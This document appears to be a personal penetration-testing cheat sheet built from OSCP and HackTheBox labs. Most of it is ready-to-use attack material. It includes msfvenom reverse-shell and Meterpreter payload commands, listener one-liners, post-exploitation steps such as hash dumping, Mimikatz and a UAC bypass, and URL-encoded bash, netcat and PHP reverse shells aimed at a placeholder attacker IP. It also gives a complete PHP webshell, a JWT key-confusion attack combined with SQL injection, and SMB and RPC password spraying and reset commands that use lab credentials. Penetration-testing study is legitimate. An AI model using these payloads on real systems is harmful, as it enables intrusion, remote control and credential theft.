msfvenom -p java/jsp_shell_reverse_tcp LHOST=<CALLBACK_IP> LPORT=<PORT> -f war > webshell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
msfvenom -l payload | grep node   # Look for node payloads
msfvenom -p
```

Example:

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
- You can use many reverse shell payloads with the `-p` flag and specify the output language with the `-f` flag.

```bash
# Example from HTB (RESOLUTE)
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
```

### Windows Reverse Shells

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LISTEN_IP> LPORT=443 -f exe > binary.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.179.175 LPORT=9999 -f dll -o Nasty.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.179.211 LPORT=4444 -f exe > shell4.exe  
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.179.176 LPORT=4444 -f python -e x86/alpha_mixed -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"    # CVE 2009-2685 - Offsec - Kevin
```

### List Payloads and Output Formats

```bash
msfvenom --list payloads    # View all 1300+ payloads
msfvenom --list format      # See all available output formats
```

### Custom MSI Payload Example (HTB Love)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.93 LPORT=9999 -f msi -o reverse.msi
```
- Run the payload on a Windows machine with:
```bash
msiexec /quiet /i reverse.msi
```
This command installs the MSI package silently, without any user interface.

### PowerShell Reverse Shell

```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.179.3 LPORT=443 > shell.bat
```

### Powerful Unlisted Commands

- **Generate ASPX Web Shell** (for use with IIS web servers):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f aspx > shell.aspx

```

- **Multi-Platform ELF Reverse Shell**:
  - Works across multiple Linux architectures (x86, x64, ARM):

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf > shell.elf
```

- **Stageless Payloads**:
  - For avoiding detection by AV (doesn’t use a staging mechanism):
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f exe -o stageless.exe
```

- **Base64 Encoded PowerShell Reverse Shell**:
  - Use this to evade simple signature-based detections:
```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f psh-cmd -o shell.ps1
```

- **Custom Bash Payload**:
  - To be used in Linux systems for command execution:
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.sh
```
- **Linux elf binary Payload** 
```
msfvenom -p linux/x86/shell_reverse_tcp -f elf lhost=<YOUR_IP> lport=4444  -o shell_86
msfvenom -p linux/x64/shell_reverse_tcp -f elf lhost=<YOUR_IP> lport=445 -o shell_64
```
- **OSCP windows x86 payload Kevin BOF buffer over flow**
```sh  
msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.179.178 LPORT=443
```

**`.ods` or `.xls` files, for a libre office macro attack - windows msfvenon offsec Haptet.**
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.179.203 LPORT=443 -f hta-psh -o evil.hta

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.179.177 LPORT-443 EXITFUNC=thread -f exe -o shell.exe    # better to use _tcp if pivoting
PS:> Start-Process -NoNewWindow -FilePAth C:\<LOCATION>\shell.exe       # msfvenom - Good to run it in this way
```

**Php Reverse shel payload**
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.179.168 LPORT=135
```

## Meterpreter Snippets

- **Start PostgreSQL DB**:  
The PostgreSQL service is not enabled by default on Kali, but it's beneficial for storing information about target hosts. Use:
```bash
sudo msfdb init
sudo systemctl enable postgresql
```

- **Check DB Status**:
```bash
msfconsole -q
msf6 > db_status
```

- **Workspaces**: Use workspaces to separate different engagements:
```bash
msf6 > workspace -a new_workspace
```

- **Useful Database Commands**:
```bash
msf6 > db_nmap -A 192.168.179.202   # Scan and save results to DB
msf6 > hosts                         # List all hosts
msf6 > services                      # List all services
msf6 > services -p 8000              # Filter by port 
```

- **Search for SMB Modules**:
```bash
msf6 > search type:auxiliary smb
msf6 > use auxiliary/scanner/smb/smb_version
```

#### Meterpreter - One-liner Listener
- Start a reverse Meterpreter listener with a one-liner:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.179.235; set LPORT 443; run;"      # Windows Meterpreter shell handler
```
**Linux_x86 Meterpreter shell handler**
```
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.179.235; set LPORT 443; set ExitOnSession false; run -j;"      # Linux_x86 Meterpreter shell handler
```
**Linux_x64 Meterpreter shell handler**
```
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.179.235; set LPORT 443; set ExitOnSession false; run -j;"    # Linux_x64 Meterpreter shell handler
```

#### Exploit Module Use Example:

- Activate module and check options:
```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > show options
msf6 auxiliary(smb_version) > services -p 445 --rhosts
msf6 auxiliary(smb_version) > edit             # msf see the source code of the exploit and edit in vim 
```



#### Meterpreter - Listener Setup (msfconsole)
1. Launch `msfconsole` and configure the handler:

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0    # Ensure correct interface is used
msf6 exploit(multi/handler) > set LHOST tun0    # Set twice to bypass known bug
msf6 exploit(multi/handler) > set LPORT 5555    # Define the listening port
msf6 exploit(multi/handler) > run               # (-j) will run in job mode in the background and not block the terminal
```

#### Meterpreter - Reverse Shell Setup
1. Create the Meterpreter payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f exe > shell.exe
```

2. Upload the payload to the target machine.
3. Start a Meterpreter listener:

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.31    # Your local IP
msf6 exploit(multi/handler) > set LPORT 1234           # Your listening port
msf6 exploit(multi/handler) > run      
msf6 exploit(multi/handler) > exploit -j               # Same but runs the exploit as a job going straight into the background
```

4. Once a session is established:

```bash
meterpreter > ps              # List running processes
meterpreter > migrate <PID>   # Secure shell by migrating to a stable process
meterpreter > hashdump        # Dump password hashes
meterpreter > shell           # Start a stable interactive shell
```

#### Key Meterpreter Commands
- **User Interaction**:

```bash
meterpreter > idletime             # Check how long the user has been idle
meterpreter > getuid               # Get current user ID
meterpreter > getsystem            # Attempt privilege escalation
meterpreter > help                 # List available Meterpreter commands
meterpreter > show advanced        # Get advnaced info on a meterpreter module
meterpreter > info                 # Get info on a meterpreter module 
meterpreter > info -d              # Meterpreter creates the most detailed version in markdown of the instructions and opens it inthe browser 
meterpreter > lpwd                 # LOCAL Present Working Directory 
```

- **Process Management in meterpreter**:

```bash
meterpreter > ps                    # List all processes
meterpreter > migrate <PID>         # Migrate session to specified process
meterpreter > execute -H -f notepad # Run hidden Notepad process
meterpreter > shell                 # Start interactive shell
meterpreter > bg                    # Background current session
```
- **Post-Exploitation in meterpreter**:

```bash
meterpreter > run post/multi/recon/local_exploit_suggester    # Suggest local exploits
meterpreter > hashdump                                        # Dump password hashes (if privileged)
meterpreter > load kiwi                                       # Load Kiwi (Mimikatz) module
meterpreter > getenv <VAR>                                    # Get specific environment variable
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.139.200   # Forward port to target machine
```

#### Meterpreter - Privilege Escalation
1. Run the local exploit suggester to find potential vulnerabilities:

```bash
msfconsole > search suggester
meterpreter > run post/multi/recon/local_exploit_suggester
```

2. Example: Using a UAC bypass exploit:

```bash
msfconsole > use exploit/windows/local/bypassuac_sdclt
```

- This leverages a Windows utility to bypass User Account Control (UAC).

#### Post-Exploitation Modules in msf
- Explore other Metasploit post-exploitation modules:

```bash
msfconsole > post/windows/*
msfconsole > exploit_suggestor
msfconsole > credential_collector
```
 
#### Proxying Through Metasploit (SOCKS)
1. Set up a SOCKS proxy and route traffic through the target:

```bash
msf > search socks
msf > use auxiliary/server/socks4a
msf > run
msf > route add <IP-OF_TARGET> <SESSION_NUMBER>
```

2. Forward local ports to remote targets:

```bash
msf > portfwd add -l <LOCALPORT> -p <REMOTEPORT> -r <REMOTE-IP>
```
- Example:

```bash
msf > portfwd add -l 3389 -p 3389 -r 172.16.139.200
```

---



# Webshell to ReverseShell with url encodeing

- **PHP** : `php -r '$sock=fsockopen("<HACKER_IP>",9001);exec("/bin/bash -i <&3 >&3 2>&3");'` >>>>> `php+-r+%27%24sock%3Dfsockopen%28%22<HACKER_IP>%22%2C9001%29%3Bexec%28%22%2Fbin%2Fbash+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27`
- **Bash** ( Reobust) : `/bin/bash -c 'bash -i >& /dev/tcp/<HACKER_IP>/9001 0>&1'` >>>  `%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F<HACKER_IP>%2F9001+0%3E%261%27`
- **Nc** ( Linux ) : `nc -e /bin/bash <HACKER_IP> 9001` ->->->-> `nc+-e+%2Fbin%2Fbash+<HACKER_IP>+9001`
- **apsx** - https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx - worked on OSCP B Mock exam 
  - and this aspx shell - https://github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx
  - Good php Webshell here - https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php - Offsec Box: Access
  - Kali native aspx shell - /usr/share/webshells/aspx/cmdasp.aspx .

#### Basic php webshell on Linux (Offsec Press) with Gif Magic bytes

```
GIF89a;
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2&<1');
    }
?>
</pre>
</body>
</html>
```

List of many magic bytes - https://en.wikipedia.org/wiki/List_of_file_signatures

### Steps for Under Construction on HTB jwt key confusion 

<details>
	<summary>Steps for Under Construction HTB </summary>

Web site and source code given. In the source code the JWT Helper uses the "jsonwebtoken" which is vuln to **CVE-2015-9235** HS/RSA key Confusion.

1. Register a user on `UnderConstructiopn` the site.
1. Take the jwt and edit it on https://jwt.io/
1. Create new Public key `.pem` file from the public key contained in the jwt. Make sure to remove all of the `\n` so the format of the key is correct, even if the lines are not the same size. We can check the key format is ok on https://jwt.io/ as you should see the "signature verified" at the bottom.

1. Look at the help menu on the python jwt_tool. https://github.com/payloadbox/sql-injection-payload-list

These are the commands we will use:

```sh
python3 jwt_tool.py --help
-t target url
-X EXPLOIT, --exploit EXPLOIT
                        exploit known vulnerabilities:
                        a = alg:none
                        n = null signature
                        b = blank password accepted in signature
                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)
                        k = key confusion (specify public key with -pk)   <--- this is what we are doing 
                        i = inject inline JWK
-pk publickey.pem file # here we will confuse the implimentation that the public key is the private key
-T   to tamper with the token
-I Try and inject new claims
-pc the payload claim we will be tampering with
-pv payload values , here sql commands to inject
```

1. First basic test. Can we create new token to look up a user which doesn't exist. If this works , we are rolling.
1. `python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. next we use the following sqli payload to find the number of columns (when we get an error we stop)
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,1--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,1,1--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. We get an error so the number of columns is 3!
  
1. Get the database version
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,sqlite_version(),1--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. Get the tables (also needs to specify the default database of sqlite_master)
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,group_concat(tbl_name),1 from sqlite_master--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. Get the columns and accounts from the sql
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,group_concat(sql),1 from sqlite_master--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. Get the flag content of the flag_storage
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,group_concat(top_secret_flaag),1 from flag_storage--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`

</details>



### SMB
<details>
	<summary>SMB: windows Vs linux</summary>

**SMB (Server Message Block)** is more commonly used on Windows than Linux, primarily due to its native integration and central role in Windows networking. In Linux, SMB is available through Samba and is used primarily for compatibility and interoperability with Windows networks. Here's a brief overview:

##### Windows Systems:
SMB is a core component of Windows networking and is used extensively in these environments. It's the default protocol for file and printer sharing in Windows.
Windows operating systems, starting from Windows for Workgroups, have integrated SMB support for network file and printer access, and it has been enhanced in subsequent versions.
SMB provides numerous features in Windows, such as network file sharing, printer sharing, and access to remote services like named pipes and mail slots.

##### Linux Systems:
In Linux, SMB support is not native but is available through tools like Samba. Samba is an open-source implementation of the SMB/CIFS networking protocol that allows Linux systems to share files and printers with Windows systems.
While Samba is widely used, especially in mixed OS environments (Windows and Unix/Linux), it is not as deeply integrated into the Linux OS as SMB is in Windows.
Linux systems often use other protocols like NFS (Network File System) for file sharing in environments dominated by Unix/Linux systems. However, SMB/Samba is preferred for compatibility in mixed environments with Windows systems.

##### Usage:
SMB's widespread use in Windows is partly due to its deep integration into the operating system, making it the standard choice for Windows-based networking tasks.
In Linux, while SMB/Samba is used, especially for interoperability with Windows systems, it is just one of several options available for network file sharing and is not as predominant as it is in Windows environments.

</details>


### smb ports 
- `135` - This is the rpc port but it is close related
- `139`
- `445` - Means we may be able to read files and if we have an admin we can psexec and get a remote shell


##### 🔐 **Port 135** – **DCE/RPC Endpoint Mapper**
- Protocol: **RPC (Remote Procedure Call)** over TCP.
- Role: Used by Windows to **discover services** including SMB.
- It's the **"hello, what services do you offer?"** port — often the entry point for enumeration.

##### 🧱 **Port 139** – **NetBIOS Session Service**
- Protocol: **NetBIOS over TCP/IP**.
- Role: SMB traffic over NetBIOS.
- Used on **older systems** (pre-Windows 2000) or in legacy networks.
- Often associated with `smbclient -m NT1` or when older compatibility is needed.

##### 🧩 **Port 445** – **SMB over TCP**
- Protocol: **Direct SMB (no NetBIOS)**. 
- Role: SMBv1, v2, and v3 communicate **directly over TCP/IP** here
- Modern Windows machines **use only port 445** for SMB.
- Exploits like **EternalBlue** target this port.




The `$` character at the end of a share name indicates it's an administrative share. Eg..
```
$ smbclient -L \\\\<IP_ADDRESS>\\ADMIN$ -U Administrator
Enter WORKGROUP\Administrator's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

```
nmap -v -p 135,139,445 -oN SMB-nmap.txt --script smb-* <IP_ADDRESS>    # smb (port 139, 445)   - nmap rigourous scan post -p-  


Linux uses forward slashes / Windows uses backward                 # smb (port 139, 445)  
smbclient -L //<IP_ADDRESS>/ -N                                    # smb (port 139, 445) - 1 List shares -N - ## smbclient
smbclient //<IP_ADDRESS>//share_name -N                            # smb (port 139, 445) - 2 Try connecting to share on an annonymous Null session 
smbclient //<IP_ADDRESS>/share_name -U Administrator               # smb (port 139, 445) - 4 Try a known username eg Administrator
smbclient //<IP_ADDRESS>/share_name -U ''                          # smb (port 139, 445) - 5 Try an empty username if not
smbclient //<IP_ADDRESS>/SHARE -m SMB2                             # smb (port 139, 445) - 6 Misc Try a different smb version V2
smbclient //<IP_ADDRESS>/SHARE -m SMB3                             # smb (port 139, 445) - 7 Misc Try a different smb version V3
smbclient //<IP_ADDRESS>/share -c 'put config.library-ms'          # smb (port 139, 445) - 8 Noddy file upload delivery method for a nasty *Library-ms file instad of email etc 
smbclient -N //192.168.179.248/transfer -m SMB3                    # smb (port 139, 445) - stat an smb session (might need to try smb version 1, 2, or 3 as here)
proxychains -q smbclient //172.16.139.21/apps -U RELIA/mountuser --password=DRtajyCwcbWvH/9     # smb (port 139, 445) -  From the relia machines . Gave a full clinet

smbclient -p 4455 -L //192.168.179.63/Scripts -U bar --password='foo' -d 10             # smb (port 139, 445) - Debug mode highest level
emun4linux <IP_ADDRESS>       # # smb (port 139, 445) - Sometimes this will show shares in the section called  =====( Nbtstat Information
 

└─# smbclient //10.129.17.50/                           # smb (port 139, 445) - 8 Misc Try a different smb version V3 Replication                                                                                                                           
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse ON                                      # smb (port 139, 445) - If you get connections - turn on recursive 
smb: \> prompt OFF                                      # smb (port 139, 445) - If you get connections - turn off the priomt for each file
smb: \> mget *                                          # smb (port 139, 445) - If you get connections - get every readable file
# Connect to the transfer share
smbclient -N //192.168.179.248/transfer -m SMB3

# Inside the smbclient prompt:                                   # smb (port 139, 445) - 
smb: \> ls              # List files                             # smb (port 139, 445) - 
smb: \> get important.txt    # Download 'important.txt'          # smb (port 139, 445) - 
smb: \> mget *          # Download all files in the directory    # smb (port 139, 445) - 
smb: \> cd subfolder    # Change directory                       # smb (port 139, 445) - 
smb: \> mget *          # Download all files in 'subfolder'      # smb (port 139, 445) - 
smb: \> exit            # Exit the smbclient                     # smb (port 139, 445) - 
```   

```
smbclient //IP_ADDRESS/_SHARE_$ -N --option='client min protocol=SMB2'        # smb - change smb version 
smbclient //IP_ADDRESS/_SHARE_$ -N -c "prompt OFF; recurse ON; mget *"        # smb - get everything with being asked
```





## netexec (formally CrackMapExc)

Wiki - https://www.netexec.wiki/ 

```sh
# netexec modules for each protocol
netexec smb -L                                                                                        # smb (port 139, 445) - eg list all the modules for smb 

netexec smb 10.129.215.226 --pass-pol                                                                 # smb (port 139, 445) -  gets the password policy
netexec smb <IP_LISTFILE> -u <UN_LISTFILE> -p <PW_LISTFILE> --local-auth --continue-on-success        # smb (port 139, 445) - lists or strings optional for Ips, Unames, Passwords
netexec smb 10.129.215.226 --shares -u usersClean.txt -p NewPW.txt                                    # smb (port 139, 445) - bruteforce with list  

# list all the shares
netexec smb <IP+-ADDDRESS> --shares                                                                   # smb (port 139, 445) - This doesnt work HOWEVER, doing an unknown user works like a guest so....
netexec smb <IP+-ADDDRESS> -u 'Random-user' -p '' --sharers 
netexec smb 192.168.179.10 -u 'guest' -p"' -M spider_plus                                               # smb (port 139, 445) - spider_plus module will look for all the files availible and parse the tree of all the files and flders yo uhave access to.
netexec smb 10.129.215.226 -u r.thompson -p rY4n5eva -M spider_plus                                   # smb (port 139, 445) - 
netexec smb <IP-ADDR> -u <USERNAME> -H '<HASH-VALUE> --local-auth --lsa                               # check ifg you can login with a hash and also dump the LSA



You can then run `jq` against the spider_plus output file wht something like:
cat / tmp/ cme__spider_plus/<ip>.json |jq '. |map_values(keys) '|`              


proxychains netexec smb 172.16.139.0/24 -u svc-auth -p secure_t1 2>/dev/null                                  # AD Tunneling - password spraying to check creds in the domain 
proxychains netexec winrm ips.txt -u users.txt -p passwords.txt -x whoami                                     # Lateral movment - chakc some creds agains many ips via proxy chains - OSCP Medtech AD 

nxc mssql 10.10.73.148 -u sql_svc -p 'Dolphin1' -X 'whoami'                                                   # netexec - run commands on the Host OS with auth'N user - This was through a tunnel on OSCP-B AD set 
nxc mssql -u sql_svc -p Dolphin1 -q "SELECT name FROM sys.databases" 10.10.73.148                             # netexec - run mssql commands with auth'N user - This was through a tunnel on OSCP-B AD set 
nxc mssql 10.10.73.148 -u sql_svc -p 'Dolphin1' -q "USE master; SELECT * FROM INFORMATION_SCHEMA.TABLES;"     # netexec - Run other mssql comds fom nxc netexe

proxychains -q nxc winrm 10.10.73.146 -u ../new_users.txt -H cleanhashes.thashes                              # netexec -   Spracy a lot of hash values - OSCP B

netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable                                           # netexec -  Enable rdp on a box 



```
impacket-mssqlclient sql_svc:Dolphin1@10.10.73.148 -windows-auth
```

```
nxc mssql 10.10.73.148 -u sql_svc -p 'Dolphin1' -q "USE master; SELECT * FROM INFORMATION_SCHEMA.TABLES;"
```


```
brutedirty 192.168.179.99 users.txt ariah4168                                                                       # netexec - wrapper script for brute force all protocols
brutedirty TARGET <USER||OR_FILE> <PASSWD||OR_FILE>                                                                 # netexec - wrapper script for brute force all protocols
```





```
[Impacket psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py); A noisy and heavy handed tool. 

## smbmap
```sh
smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <IPADDRESS> # fussy about the order 
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.17.50 # fussy about the order

smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <IPADDRESS> -r <RecursiveLocalToSearch> --depth=10  
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.17.50 -r Users --depth=10  

smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <IPADDRESS> --download <FILEPATHTODOWNLOAD>
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.17.50 --download ./Users/SVC_TGS/Desktop/user.txt 
```
## smbpasswd 
Can set passwords
- `smbpasswd -U <USERNAME> -r <REALM> ....`

### rcpclient tool (port 135)
- `rpcclient$> <PRESS_TAB>   # gives all modules list` 

[Interesting notes](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/) 
Try an NULL login:
```
rpcclient -U "" <IPADDRESS>                                   # rpc port 135 - 
rpcclient$> setuserinfo2 <USERNAME> <level> <PASSWORD>        # rpc port 135 - Try changeing a password -  (https://malicious.link/posts/2017/reset-ad-user-password-with-linux/)
 ( level set to 23 normally see [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN) , without encryption). Result should not retun anything , and that means it worked. 
```


```
rpcclient -U "" 10.129.215.226 -N        # rpc port 135 -N made a difference
rpcclient $> enumdomusers		             # rpc port 135 - others cmds at the bottom)
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
rpcclient $> 
```

With the user name data in a file users.txt ( HTB - CASCADE)   
`cat users.txt | while read line; do echo "$line"| cut -d"[" -f2 | cut -d"]" -f1; done > usersClean.txt`
I then ran `"cat usersClean.txt| while read line; do smbmap -H 10.129.215.226 -u "$line" ; done`

**rpcclient** tool has autocomplete for commnds below and more
```
queryuser                               # rpcclient - Retrieves detailed information about a specific user.
queryusergroups  <RID>                  # rpcclient - list a users group membership 
querygroup <GROUP_RID>                  # rpcclient - Gets information about a particular group.
netshareenum                            # rpcclient - Lists all shared resources on the server.
getdompwinfo                            # rpcclient - Retrieves domain password information.
lookupnames                             # rpcclient - Resolves names to security identifiers (SIDs).
lookupsids                              # rpcclient - Converts SIDs to their corresponding names.
enumprivs                               # rpcclient - Enumerates privileges.
querydominfo                            # rpcclient - Gets information about the domain.
enumprinters                            # rpcclient - Lists printers shared on the server.
createdomuser                           # rpcclient - Creates a new domain user.
deletedomuser                           # rpcclient - Deletes a domain user.
setuserinfo                             # rpcclient - Modifies user information.
enumalsgroups                           # rpcclient - Enumerates local alias groups.
querydispinfo                           # rpcclient - see if there is anything in a description feild
``` 


In the rpcclient tool, the `setuserinfo` function is used to modify user account information on a remote Windows system. 
The level parameter in this context refers to the level of information detail that you want to modify or retrieve when working with user account data.

Commonly used levels for user account information include:
Level 0: Basic information, such as username and full name.
Level 1: Additional information, including home directory, script path, and profile path.
Level 2: Further information, like password age, privileges, and logon script.
Level 3: Detailed information, including all the above and group memberships.
Level 4: Even more detailed information, including all the above and security identifier (SID).

To set a user's password using the rpcclient tool, you would typically use `setuserinfo2` function with a level of `23`. The level parameter corresponds to the level of user information that you're modifying, and for changing passwords, the relevant level is `23`. Level 23 includes all the attributes from level 1 (which provides basic user information) and adds the ability to modify the user's password.

The `setuserinfo` function in `rpcclient` is typically used to modify user account information, but it might not directly support changing passwords. To change a user's password using rpcc`lient, the `setuserinfo2` function with level `23` is the recommended approach.

The `setuserinfo2` function with level 23 allows you to modify password-related information, including changing the user's password. Level 23 includes all the attributes from level 1 and provides the additional functionality to manage passwords.

While some versions of `rpcclient` might support changing passwords using `setuserinfo` with certain parameters, it's safer and more consistent to use `setuserinfo2` with level 23 for password changes.

```
rpcclient> setuserinfo christopher.lewis 23 'Tuesday@2'
```

## SNMP

```
sudo nmap -sU --open -p 161 192.168.179.1-254 -oG open-snmp.txt
```
```
public
private
manager
```

```
#  Make a list of IPs
for ip in $(seq 1 254); do echo 192.168.179.$ip; done > ips

# Run 161
onesixtyone -c community -i ips
```


| MIB Value          |  Related Information | 
|:----------------------:|:----------------:|
|  1.3.6.1.2.1.25.1.6.0  | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 |  Processes Path  |
| 1.3.6.1.2.1.25.2.3.1.4 |   Storage Units  |
| 1.3.6.1.2.1.25.6.3.1.2 |   Software Name  |
|  1.3.6.1.4.1.77.1.2.25 |   User Accounts  |
|  1.3.6.1.2.1.6.13.1.3  |  TCP Local Ports |


### Other handy MIB values
System Information MIBs:
System Description: 1.3.6.1.2.1.1.1
System Uptime: 1.3.6.1.2.1.1.3
System Contact: 1.3.6.1.2.1.1.4
System Name: 1.3.6.1.2.1.1.5
System Location: 1.3.6.1.2.1.1.6

#### Interface Information MIBs:
Interface Status: 1.3.6.1.2.1.2.2.1.8
Interface Speed: 1.3.6.1.2.1.2.2.1.5
Interface MAC Address: 1.3.6.1.2.1.2.2.1.6
Interface IP Address: 1.3.6.1.2.1.4.20.1.1
Interface IP Address Table: 1.3.6.1.2.1.4.20

#### Network Performance and Error Statistics:
ICMP Statistics: 1.3.6.1.2.1.5
TCP Connections: 1.3.6.1.2.1.6.13.1
UDP Information: 1.3.6.1.2.1.7

#### Routing Information:
IP Forwarding Table: 1.3.6.1.2.1.4.21
Default Gateway: 1.3.6.1.2.1.4.21.1.7
Routing Table: 1.3.6.1.2.1.4.24

#### Storage and Disk Information:
Disk Storage Table: 1.3.6.1.2.1.25.2.3
Disk Space Usage: 1.3.6.1.2.1.25.2.3.1.6

#### Process and Application Information:  
Process Table: 1.3.6.1.2.1.25.4.2
Installed Software List: 1.3.6.1.2.1.25.6.3.1

#### User and Group Information:
Group Accounts: 1.3.6.1.4.1.77.1.2.3

#### Device Specific MIBs:
Printer MIBs: 1.3.6.1.2.1.43
UPS MIBs: 1.3.6.1.2.1.33

#### Environment Monitoring MIBs:
Temperature Sensors: 1.3.6.1.4.1.674.10892.2.3.1.12
Fan Status: 1.3.6.1.4.1.674.10892.2.3.1.15

```
snmpwalk -c <COMMUNITY_STRING> -v1 <IP_ADDRESS> <MIB_VALUE>
snmpwalk -c <COMMUNITY_STRING> -Oa -v1 <IP_ADDRESS> <MIB_VALUE>    '# convert hex to Ascii
snmpwalk -v <SNMP_VERSION> -c public 192.168.179.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull    # snmp command from hack tricks to ook for clear text hints/creds

```

## LDAP

- `nmap -n -sV --script "ldap* and not brute" <IP-ADDRESS>`

<details>
	<summary>Some Hashes and IDs in Windows</summary>

Domain\uid: This is the domain and user ID (UID) of the account. For example, "Administrator" is the UID of the account on the domain.

**RID**: The Relative Identifier (RID) is a value that uniquely identifies an account within a domain. In the Windows Security Account Manager (SAM), each user account and group has a unique RID. For example, the built-in Administrator account typically has a RID of 500.

**LM hash**: LAN Manager (LM) hash is an outdated and insecure method to store Windows passwords. It's known for its weaknesses and susceptibility to brute-force attacks. The LM hash is split into two 7-character chunks and hashed separately, creating vulnerabilities. 
In modern systems, you often see it stored as **aad3b435b51404eeaad3b435b51404ee**, which represents a blank or unused LM hash (as LM hashing is typically disabled).


